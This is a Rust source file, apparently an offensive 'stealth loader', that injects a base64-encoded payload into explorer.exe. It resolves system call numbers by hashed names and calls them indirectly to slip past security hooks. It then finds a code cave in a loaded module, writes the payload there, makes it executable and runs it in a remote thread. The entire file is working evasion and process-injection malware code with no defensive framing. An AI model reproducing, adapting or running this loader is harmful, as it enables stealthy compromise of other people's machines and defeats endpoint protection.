#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(dead_code)]

use std::ffi::{c_void, CStr};
use std::ptr::null_mut;
use base64::{Engine as _, engine::general_purpose};
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::Foundation::*;

/*
    ================================================================================
    2026 STEALTH LOADER - FINAL ROBUST EDITION
    ================================================================================
*/

// --- Manual PE & System Structure Definitions ---

#[repr(C)] pub struct IMAGE_DOS_HEADER { pub e_magic: u16, pub e_cblp: u16, pub e_cp: u16, pub e_crlc: u16, pub e_cparhdr: u16, pub e_minalloc: u16, pub e_maxalloc: u16, pub e_ss: u16, pub e_sp: u16, pub e_csum: u16, pub e_ip: u16, pub e_cs: u16, pub e_lfarlc: u16, pub e_ovno: u16, pub e_res: [u16; 4], pub e_oemid: u16, pub e_oeminfo: u16, pub e_res2: [u16; 10], pub e_lfanew: i32 }
#[repr(C)] pub struct IMAGE_FILE_HEADER { pub Machine: u16, pub NumberOfSections: u16, pub TimeDateStamp: u32, pub PointerToSymbolTable: u32, pub NumberOfSymbols: u32, pub SizeOfOptionalHeader: u16, pub Characteristics: u16 }
#[repr(C)] pub struct IMAGE_DATA_DIRECTORY { pub VirtualAddress: u32, pub Size: u32 }
#[repr(C)] pub struct IMAGE_OPTIONAL_HEADER64 { pub Magic: u16, pub MajorLinkerVersion: u8, pub MinorLinkerVersion: u8, pub SizeOfCode: u32, pub SizeOfInitializedData: u32, pub SizeOfUninitializedData: u32, pub AddressOfEntryPoint: u32, pub BaseOfCode: u32, pub ImageBase: u64, pub SectionAlignment: u32, pub FileAlignment: u32, pub MajorOperatingSystemVersion: u16, pub MinorOperatingSystemVersion: u16, pub MajorImageVersion: u16, pub MinorImageVersion: u16, pub MajorSubsystemVersion: u16, pub MinorSubsystemVersion: u16, pub Win32VersionValue: u32, pub SizeOfImage: u32, pub SizeOfHeaders: u32, pub CheckSum: u32, pub Subsystem: u16, pub DllCharacteristics: u16, pub SizeOfStackReserve: u64, pub SizeOfStackCommit: u64, pub SizeOfHeapReserve: u64, pub SizeOfHeapCommit: u64, pub LoaderFlags: u32, pub NumberOfRvaAndSizes: u32, pub DataDirectory: [IMAGE_DATA_DIRECTORY; 16] }
#[repr(C)] pub struct IMAGE_NT_HEADERS64 { pub Signature: u32, pub FileHeader: IMAGE_FILE_HEADER, pub OptionalHeader: IMAGE_OPTIONAL_HEADER64 }
#[repr(C)] pub struct IMAGE_EXPORT_DIRECTORY { pub Characteristics: u32, pub TimeDateStamp: u32, pub MajorVersion: u16, pub MinorVersion: u16, pub Name: u32, pub Base: u32, pub NumberOfFunctions: u32, pub NumberOfNames: u32, pub AddressOfFunctions: u32, pub AddressOfNames: u32, pub AddressOfNameOrdinals: u32 }
#[repr(C)] pub struct IMAGE_SECTION_HEADER { pub Name: [u8; 8], pub Misc: IMAGE_SECTION_HEADER_MISC, pub VirtualAddress: u32, pub SizeOfRawData: u32, pub PointerToRawData: u32, pub PointerToRelocations: u32, pub PointerToLinenumbers: u32, pub NumberOfRelocations: u16, pub NumberOfLinenumbers: u16, pub Characteristics: u32 }
#[repr(C)] pub union IMAGE_SECTION_HEADER_MISC { pub PhysicalAddress: u32, pub VirtualSize: u32 }
#[repr(C)] pub struct UNICODE_STRING { pub Length: u16, pub MaximumLength: u16, pub Buffer: *mut u16 }
#[repr(C)] pub struct LIST_ENTRY { pub Flink: *mut LIST_ENTRY, pub Blink: *mut LIST_ENTRY }
#[repr(C)] pub struct PEB_LDR_DATA { pub Length: u32, pub Initialized: u8, pub SsHandle: *mut c_void, pub InLoadOrderModuleList: LIST_ENTRY }
#[repr(C)] pub struct PEB { pub Reserved1: [u8; 2], pub BeingDebugged: u8, pub Reserved2: [u8; 1], pub Reserved3: [*mut c_void; 2], pub Ldr: *mut PEB_LDR_DATA }
#[repr(C)] pub struct LDR_DATA_TABLE_ENTRY { pub InLoadOrderLinks: LIST_ENTRY, pub InMemoryOrderLinks: LIST_ENTRY, pub InInitializationOrderLinks: LIST_ENTRY, pub DllBase: *mut c_void, pub EntryPoint: *mut c_void, pub SizeOfImage: u32, pub FullDllName: UNICODE_STRING, pub BaseDllName: UNICODE_STRING }
#[repr(C)] pub struct CLIENT_ID { pub UniqueProcess: HANDLE, pub UniqueThread: HANDLE }
#[repr(C)] pub struct OBJECT_ATTRIBUTES { pub Length: u32, pub RootDirectory: HANDLE, pub ObjectName: *mut UNICODE_STRING, pub Attributes: u32, pub SecurityDescriptor: *mut c_void, pub SecurityQualityOfService: *mut c_void }
#[repr(C)] pub struct SYSTEM_PROCESS_INFORMATION { pub NextEntryOffset: u32, pub NumberOfThreads: u32, pub WorkingSetPrivateSize: i64, pub HardFaultCount: u32, pub NumberOfThreadsHighWatermark: u32, pub CycleTime: u64, pub CreateTime: i64, pub UserTime: i64, pub KernelTime: i64, pub ImageName: UNICODE_STRING, pub BasePriority: i32, pub UniqueProcessId: HANDLE, pub InheritedFromUniqueProcessId: HANDLE }
#[repr(C)] pub struct PROCESS_BASIC_INFORMATION { pub ExitStatus: i32, pub PebBaseAddress: *mut PEB, pub AffinityMask: usize, pub BasePriority: i32, pub UniqueProcessId: usize, pub InheritedFromUniqueProcessId: usize }

// --- Indirect Syscall Logic ---

#[inline(always)]
unsafe fn sys_call(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize, a9: usize, a10: usize, a11: usize) -> NTSTATUS {
    let mut status: i32;
    #[cfg(target_arch = "x86_64")]
    std::arch::asm!(
        "mov r10, rcx",
        "sub rsp, 0x68",
        "mov [rsp + 0x20], {a5}",
        "mov [rsp + 0x28], {a6}",
        "mov [rsp + 0x30], {a7}",
        "mov [rsp + 0x38], {a8}",
        "mov [rsp + 0x40], {a9}",
        "mov [rsp + 0x48], {a10}",
        "mov [rsp + 0x50], {a11}",
        "call {gadget}",
        "add rsp, 0x68",
        a5 = in(reg) a5, a6 = in(reg) a6, a7 = in(reg) a7, a8 = in(reg) a8, a9 = in(reg) a9, a10 = in(reg) a10, a11 = in(reg) a11,
        gadget = in(reg) gadget, in("rcx") a1, in("rdx") a2, in("r8") a3, in("r9") a4, in("eax") ssn, lateout("rax") status, out("r11") _, out("r10") _,
    );
    #[cfg(not(target_arch = "x86_64"))] { status = -1; let _ = (ssn, gadget, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11); }
    status
}

fn dbj2(s: &str) -> u32 {
    let mut h: u32 = 5381;
    for c in s.bytes() { h = ((h << 5).wrapping_add(h)).wrapping_add(c as u32); }
    h
}

unsafe fn get_local_module(h: u32) -> Option<*mut c_void> {
    #[cfg(target_arch = "x86_64")]
    let peb: *const PEB;
    #[cfg(target_arch = "x86_64")]
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    let ldr = (*peb).Ldr;
    let mut curr = (*ldr).InLoadOrderModuleList.Flink;
    while curr != (&mut (*ldr).InLoadOrderModuleList as *mut LIST_ENTRY) {
        let entry = curr as *const LDR_DATA_TABLE_ENTRY;
        if !(*entry).BaseDllName.Buffer.is_null() {
            let name = String::from_utf16_lossy(std::slice::from_raw_parts((*entry).BaseDllName.Buffer, ((*entry).BaseDllName.Length / 2) as usize)).to_lowercase();
            if dbj2(&name) == h { return Some((*entry).DllBase); }
        }
        curr = (*curr).Flink;
    }
    None
}

unsafe fn find_ssn_and_gadget(ntdll: *mut c_void, h: u32) -> Option<(u32, usize)> {
    let base = ntdll as usize;
    let dos = base as *const IMAGE_DOS_HEADER;
    let nt = (base + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    let exp_dir_va = (*nt).OptionalHeader.DataDirectory[0].VirtualAddress as usize;
    let exp_dir = (base + exp_dir_va) as *const IMAGE_EXPORT_DIRECTORY;
    let names = std::slice::from_raw_parts((base + (*exp_dir).AddressOfNames as usize) as *const u32, (*exp_dir).NumberOfNames as usize);
    let functions = std::slice::from_raw_parts((base + (*exp_dir).AddressOfFunctions as usize) as *const u32, (*exp_dir).NumberOfFunctions as usize);
    let ords = std::slice::from_raw_parts((base + (*exp_dir).AddressOfNameOrdinals as usize) as *const u16, (*exp_dir).NumberOfNames as usize);

    for i in 0..(*exp_dir).NumberOfNames as usize {
        if let Ok(name) = CStr::from_ptr((base + names[i] as usize) as *const i8).to_str() {
            if dbj2(name) == h {
                let ord = ords[i] as usize;
                let ptr = (base + functions[ord] as usize) as *const u8;
                let mut gadget = 0usize;
                for j in 0..500 { if *ptr.add(j) == 0x0F && *ptr.add(j+1) == 0x05 && *ptr.add(j+2) == 0xC3 { gadget = ptr.add(j) as usize; break; } }
                if *ptr == 0x4c && *ptr.add(1) == 0x8b && *ptr.add(2) == 0xd1 && *ptr.add(3) == 0xb8 { return Some((*(ptr.add(4) as *const u32), gadget)); }
                for j in 1..32 {
                    if ord >= j {
                        let up = (base + functions[ord - j] as usize) as *const u8;
                        if *up == 0x4c && *up.add(1) == 0x8b && *up.add(2) == 0xd1 && *up.add(3) == 0xb8 { return Some(((*(up.add(4) as *const u32)).wrapping_add(j as u32), gadget)); }
                    }
                    if ord + j < (*exp_dir).NumberOfFunctions as usize {
                        let down = (base + functions[ord + j] as usize) as *const u8;
                        if *down == 0x4c && *down.add(1) == 0x8b && *down.add(2) == 0xd1 && *down.add(3) == 0xb8 { return Some(((*(down.add(4) as *const u32)).wrapping_sub(j as u32), gadget)); }
                    }
                }
            }
        }
    }
    None
}

// --- Main Program ---

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("[*] 2026 Advanced Stealth Loader");
    let payload_b64 = "yc8AAAAAQAAAAP9BvAIAAABYAAAAYAAAAIAAAAD0AAAAVAAAAGAAAACAAAAAyAAAAOQAAAD4AAAAAAAAAAsAAAAUAACAAAAAgAAAAMAAAADUAAAA6AAAAAAAAACAAAAA4AAAAPAAAAD4AAAABAEAAAgBAAAMAQAADgEAAA4BAAAPAQAAKAEAAAgBAAA";
    let shellcode = general_purpose::STANDARD.decode(payload_b64)?;

    unsafe {
        let ntdll = get_local_module(dbj2("ntdll.dll")).expect("ntdll failed");
        let (ssn_open, gadget) = find_ssn_and_gadget(ntdll, dbj2("NtOpenProcess")).expect("open ssn failed");
        let (ssn_read, _) = find_ssn_and_gadget(ntdll, dbj2("NtReadVirtualMemory")).expect("read ssn failed");
        let (ssn_write, _) = find_ssn_and_gadget(ntdll, dbj2("NtWriteVirtualMemory")).expect("write ssn failed");
        let (ssn_protect, _) = find_ssn_and_gadget(ntdll, dbj2("NtProtectVirtualMemory")).expect("protect ssn failed");
        let (ssn_thread, _) = find_ssn_and_gadget(ntdll, dbj2("NtCreateThreadEx")).expect("thread ssn failed");
        let (ssn_query, _) = find_ssn_and_gadget(ntdll, dbj2("NtQuerySystemInformation")).expect("query ssn failed");
        let (ssn_proc, _) = find_ssn_and_gadget(ntdll, dbj2("NtQueryInformationProcess")).expect("proc ssn failed");

        let mut buffer = vec![0u8; 1024 * 1024];
        let mut len = 0u32;
        let mut st = sys_call(ssn_query, gadget, 5, buffer.as_mut_ptr() as usize, buffer.len(), &mut len as *mut _ as usize, 0, 0, 0, 0, 0, 0, 0);
        if st != 0 { return Err("Query failed".into()); }

        let mut exp_pid: HANDLE = null_mut();
        let mut offset = 0;
        loop {
            let info = buffer.as_ptr().add(offset) as *const SYSTEM_PROCESS_INFORMATION;
            if !(*info).ImageName.Buffer.is_null() {
                let name = String::from_utf16_lossy(std::slice::from_raw_parts((*info).ImageName.Buffer, ((*info).ImageName.Length / 2) as usize));
                if name.to_lowercase() == "explorer.exe" { exp_pid = (*info).UniqueProcessId; break; }
            }
            if (*info).NextEntryOffset == 0 { break; }
            offset += (*info).NextEntryOffset as usize;
        }
        if exp_pid.is_null() { return Err("Explorer not found".into()); }

        let mut h_proc: HANDLE = null_mut();
        let mut oa = OBJECT_ATTRIBUTES { Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32, RootDirectory: null_mut(), ObjectName: null_mut(), Attributes: 0, SecurityDescriptor: null_mut(), SecurityQualityOfService: null_mut() };
        let mut cid = CLIENT_ID { UniqueProcess: exp_pid, UniqueThread: null_mut() };
        st = sys_call(ssn_open, gadget, &mut h_proc as *mut _ as usize, 0x1FFFFF, &mut oa as *mut _ as usize, &mut cid as *mut _ as usize, 0, 0, 0, 0, 0, 0, 0);
        if st != 0 || h_proc.is_null() { return Err("Open failed".into()); }

        let mut pbi: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
        sys_call(ssn_proc, gadget, h_proc as usize, 0, &mut pbi as *mut _ as usize, std::mem::size_of::<PROCESS_BASIC_INFORMATION>(), 0, 0, 0, 0, 0, 0, 0);
        let mut peb_copy: PEB = std::mem::zeroed();
        sys_call(ssn_read, gadget, h_proc as usize, pbi.PebBaseAddress as usize, &mut peb_copy as *mut _ as usize, std::mem::size_of::<PEB>(), 0, 0, 0, 0, 0, 0, 0);
        let mut ldr_copy: PEB_LDR_DATA = std::mem::zeroed();
        sys_call(ssn_read, gadget, h_proc as usize, peb_copy.Ldr as usize, &mut ldr_copy as *mut _ as usize, std::mem::size_of::<PEB_LDR_DATA>(), 0, 0, 0, 0, 0, 0, 0);

        let mut curr_link = ldr_copy.InLoadOrderModuleList.Flink;
        let mut cave_addr = 0usize;
        while curr_link != (peb_copy.Ldr as usize + 16) as *mut LIST_ENTRY {
            let mut entry: LDR_DATA_TABLE_ENTRY = std::mem::zeroed();
            sys_call(ssn_read, gadget, h_proc as usize, curr_link as usize, &mut entry as *mut _ as usize, std::mem::size_of::<LDR_DATA_TABLE_ENTRY>(), 0, 0, 0, 0, 0, 0, 0);
            let mut n_buf = vec![0u16; (entry.BaseDllName.Length / 2) as usize];
            sys_call(ssn_read, gadget, h_proc as usize, entry.BaseDllName.Buffer as usize, n_buf.as_mut_ptr() as usize, entry.BaseDllName.Length as usize, 0, 0, 0, 0, 0, 0, 0);
            let name = String::from_utf16_lossy(&n_buf).to_lowercase();

            if !name.contains("ntdll") && !name.contains("kernel") {
                let mut dos: IMAGE_DOS_HEADER = std::mem::zeroed();
                sys_call(ssn_read, gadget, h_proc as usize, entry.DllBase as usize, &mut dos as *mut _ as usize, std::mem::size_of::<IMAGE_DOS_HEADER>(), 0, 0, 0, 0, 0, 0, 0);
                let mut nt: IMAGE_NT_HEADERS64 = std::mem::zeroed();
                sys_call(ssn_read, gadget, h_proc as usize, entry.DllBase as usize + dos.e_lfanew as usize, &mut nt as *mut _ as usize, std::mem::size_of::<IMAGE_NT_HEADERS64>(), 0, 0, 0, 0, 0, 0, 0);
                let s_base = entry.DllBase as usize + dos.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>();
                for i in 0..nt.FileHeader.NumberOfSections {
                    let mut s: IMAGE_SECTION_HEADER = std::mem::zeroed();
                    sys_call(ssn_read, gadget, h_proc as usize, s_base + (i as usize * std::mem::size_of::<IMAGE_SECTION_HEADER>()), &mut s as *mut _ as usize, std::mem::size_of::<IMAGE_SECTION_HEADER>(), 0, 0, 0, 0, 0, 0, 0);
                    if s.Name[0] == b'.' && s.Name[1] == b't' {
                        let start = entry.DllBase as usize + s.VirtualAddress as usize;
                        let size = s.Misc.VirtualSize as usize;
                        let mut t_buf = vec![0u8; size];
                        sys_call(ssn_read, gadget, h_proc as usize, start, t_buf.as_mut_ptr() as usize, size, 0, 0, 0, 0, 0, 0, 0);
                        let mut count = 0;
                        for j in (0..size).rev() {
                            if t_buf[j] == 0x00 || t_buf[j] == 0xCC { count += 1; } else { count = 0; }
                            if count >= shellcode.len() { cave_addr = start + j; break; }
                        }
                    }
                    if cave_addr != 0 { break; }
                }
            }
            if cave_addr != 0 { break; }
            curr_link = entry.InLoadOrderLinks.Flink;
        }
        if cave_addr == 0 { return Err("Cave failed".into()); }
        println!("[+] Injection Target: 0x{:x}", cave_addr);

        let mut base = cave_addr as *mut c_void;
        let mut sz = shellcode.len();
        let mut old = 0u32;
        sys_call(ssn_protect, gadget, h_proc as usize, &mut base as *mut _ as usize, &mut sz as *mut _ as usize, PAGE_READWRITE as usize, &mut old as *mut _ as usize, 0, 0, 0, 0, 0, 0);
        sys_call(ssn_write, gadget, h_proc as usize, cave_addr, shellcode.as_ptr() as usize, shellcode.len(), 0, 0, 0, 0, 0, 0, 0);
        sys_call(ssn_protect, gadget, h_proc as usize, &mut base as *mut _ as usize, &mut sz as *mut _ as usize, PAGE_EXECUTE_READ as usize, &mut old as *mut _ as usize, 0, 0, 0, 0, 0, 0);

        let mut h_th: HANDLE = null_mut();
        st = sys_call(ssn_thread, gadget, &mut h_th as *mut _ as usize, 0x1FFFFF, 0, h_proc as usize, cave_addr, 0, 0, 0, 0, 0, 0);
        if st == 0 && !h_th.is_null() {
            println!("[+] Execution Started.");
            windows_sys::Win32::System::Threading::WaitForSingleObject(h_th, 0xFFFFFFFF);
        } else {
            println!("[-] Exec failed: 0x{:x}", st);
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test] fn test_h() { assert_eq!(dbj2("ntdll.dll"), dbj2("ntdll.dll")); }
}
